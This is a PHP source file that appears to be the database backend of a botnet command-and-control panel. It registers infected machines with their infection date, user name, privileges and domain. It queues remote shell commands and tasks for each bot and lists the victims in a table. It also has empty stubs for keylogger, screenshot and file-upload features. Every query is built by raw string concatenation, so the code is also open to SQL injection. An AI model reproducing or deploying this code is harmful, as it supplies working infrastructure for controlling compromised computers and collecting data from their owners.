<?php
	require_once("config.php");
	require_once("security.php");

// Generic
	function __db_connect() {
		if(($mysql = mysql_connect(DB_HOST, DB_USER, DB_PASS))==FALSE) {
			return -1;
		}
		
		if(mysql_select_db(DB_NAME, $mysql)==FALSE)
			return -1;


		return($mysql);
	}
	
	function __db_close($mysql) {
		return(mysql_close($mysql));
	}

// Bot control
	function __db_bot_id_exists($botid) {
		if(($mysql = __db_connect())==-1)
			return -1;

		if(($result = mysql_query("SELECT (botid) FROM " . DB_TABLE_BOTS . " WHERE botid='" . $botid . "'"))==FALSE)
			return;

		$ret = mysql_affected_rows($mysql);
		__db_close($mysql);
		return($ret);
	}
	
	function __db_bot_new($ip,$botid) {
		if(__db_bot_id_exists($botid)==NULL) {
			if(($mysql = __db_connect())==-1)
				return -1;

			if(($result = mysql_query("INSERT INTO " . DB_TABLE_BOTS . " (last_date,infection_date,ip,botid) VALUES (NOW(),NOW(),'" . $ip . "','" . $botid . "')"))!=FALSE) {
				__db_close($mysql);
				return 1;
			}
		
			else {
				__db_close($mysql);
				return -1;
			}
		}
		
		return 0;
	}

	function __db_bot_edit($ip,$botid,$data) { }// sin aañadir a base de datos
/*
		if(__db_bot_id_exists($botid)==NULL) {
			__db_bot_new($ip,$botid);
		}

		$arr = explode("#", $data);

		$user_name = $arr[0]
		$computer_name = $arr[1];
		$os_version = $arr[2];
		$botid = $arr[3]; 
		
		return 0;
	}
*/


//List bots
	function __db_list_all_bots() {
		if(($mysql = __db_connect())==-1)
			return -1;

		if(($result = mysql_query("SELECT * from " . DB_TABLE_BOTS, $mysql))==FALSE)
			return -1;

		$i=0;
		while($row = mysql_fetch_array($result)) {
        		echo("<tr>");
			echo("<td><a href=\"./view.php?bid=" . __security_output($row['botid']) . "\">"  . __security_output($row['ip']) . "</a></td>");
			echo("<td>" . __security_output($row['geo']) . "</td>");
			echo("<td>" . __security_output($row['privileges']) . "</td>");
			echo("<td>" . __security_output($row['user_name']) . "</td>"); // |____
			echo("<td>" . __security_output($row['cpu_name']) . "</td>");  // |___ 1 row in front-end table
			echo("<td>" . __security_output($row['domain']) . "</td>");    // |
			echo("<td>" . __security_output($row['last_date']) . "</td>");
			echo("<td>" . __security_output($row['infection_date']) . "</td>");
			echo("</tr>");
			$i+=1;	
		}

		__db_close($mysql);
		return(0);
	}



//View bots
	function __db_find_uploads() {}
	function __db_find_keylogger() {}
	function __db_find_shell() {}
	function __db_find_screenshot() {}
	function __db_find_task() {}



//File	
	function __db_file_new() {}
	function __db_file_write() {}
	function __db_file_close() {}



//Keylogger
	function __db_keylogger_add() {}
	function __db_keylogger_del() {}



//Screenshot
	function __db_screenshot_add() {}
	function __db_screenshot_del() {}



//Shell
	function __db_shell_add($botid) {
                $query = "INSERT INTO " . DB_TABLE_SHELL . " (botid,command,status) VALUES ('" . $botid . "','Shell started\n','0')";    

		if(__db_shell_exists($botid)==true) {
			echo("Error: duplication shell");
			return false;
		}


                if(($mysql = __db_connect())==-1)
                                return false;

		

                if(($result = mysql_query($query,$mysql))==FALSE) {
                        __db_close($mysql);
                        return false;
                }

		if(mysql_affected_rows($mysql)!=0) {
			echo("OK");
			__db_close();
			return true;
		}
	

		__db_close($mysql);
		return false;
	}

	function __db_shell_del($botid) {
		if(($mysql = __db_connect())==-1)
				return false;
		
		mysql_query("DELETE FROM " . DB_TABLE_SHELL . " WHERE botid='" . $botid . "'",$mysql);
		__db_close($mysql);
		return true;

	}

	function __db_shell_get($botid) {
		$query_action = "UPDATE " . DB_TABLE_SHELL . " SET status='1' WHERE botid='" . $botid . "'";
		$query = "SELECT * FROM " . DB_TABLE_SHELL . " WHERE botid='" . $botid . "'";


		if(__db_shell_exists($botid)==false)
                        return false;

		
		if(($mysql = __db_connect())==-1)
			return false;


		if(($result=mysql_query($query,$mysql))==NULL) {
			__db_close($mysql);
			return false;
		}

		$row = mysql_fetch_assoc($result);
		if(mysql_affected_rows($mysql)==0) {
			__db_close($mysql);
                       return false;
                }
 
		if($row['status']==0) {
			$cmd = str_replace("\\", "\\\\", $row['command']);
			//$cmd = addslashes($row['command']);
			$cmd = $row['command'];
			echo($cmd);
			mysql_query($query_action,$mysql);
			__db_close($mysql);
			return true;
		}

		return true;
	}

	function __db_shell_push($botid, $command) {
		if(__db_shell_exists($botid)==false)
			return false;

		if(($mysql = __db_connect())==-1)
 	               return false;

                $query = "SELECT * FROM " . DB_TABLE_SHELL . " WHERE botid='" . $botid . "'";

                if(($result=mysql_query($query, $mysql))==0) {
                        __db_close($mysql);
                        return false;
                }
		
		$row = mysql_fetch_assoc($result);
	

		$command = $row['command'] . $command;
		//command = addslashes($command);
		$command = str_replace("\\", "\\\\", $command);

	        $query_action = "UPDATE " . DB_TABLE_SHELL . " SET command='" . $command . "', status='0' WHERE botid='" . $botid . "'";	
		if(mysql_query($query_action,$mysql)!=0) { 
			if(mysql_affected_rows($mysql)!=0) {
				echo("!OK");
				__db_close($mysql);
				return true;
			}
		}
		__db_close($mysql);
		return false;
	}


	function __db_shell_exists($botid) {
		$query = "SELECT * FROM " . DB_TABLE_SHELL . " WHERE botid='" . $botid . "'";

		if(($mysql = __db_connect())==-1)
                        return false;

                if(($result=mysql_query($query,$mysql))==NULL) {
                        __db_close($mysql);
                        return false;
                }

		mysql_fetch_assoc($result);

                if(mysql_affected_rows($mysql)!=0) {
                        __db_close($mysql);
                        return true;
                }
	
		__db_close($mysql);
		return false;
	}


	function __db_shell_unlock($botid) {
		$query = "UPDATE " . DB_TABLE_SHELL . " SET status='0' WHERE botid='" . $botid . "'";

                if(($mysql = __db_connect())==-1)
                        return false;

                if(($result=mysql_query($query,$mysql))==NULL) {
                        __db_close($mysql);
                        return false;
                }

		__db_close($mysql);
		return true;
	}

//Task
	function __db_task_push($botid,$command) {
		if(($mysql = __db_connect())==-1)
			return -1;

                if(($result = mysql_query("INSERT INTO " . DB_TABLE_TASK . " (botid,command) VALUES ('" . $botid . "','" . $command . "')",$mysql))==FALSE)
			return -1;

		$ret = mysql_affected_rows($mysql);
                __db_close($mysql);
                return($ret);
	}


	function __db_task_pop($botid) {
                if(($mysql = __db_connect())==-1)
			return -1;

                $result = mysql_query("SELECT (command) FROM " . DB_TABLE_TASK . " WHERE botid='" . $botid . "' LIMIT 1",$mysql);

		if($result==FALSE) {
			__db_close($mysql);
			return NULL;
		}
		$row = mysql_fetch_assoc($result);
		if(mysql_affected_rows($mysql)==0) {
			__db_close($mysql);
			return NULL;
		}
		$ret = $row['command'];
		mysql_query("DELETE FROM " . DB_TABLE_TASK . " WHERE command='" . $ret . "' AND botid='" . $botid . "' LIMIT 1");
		__db_close($mysql);
                return($ret);
	}


?>
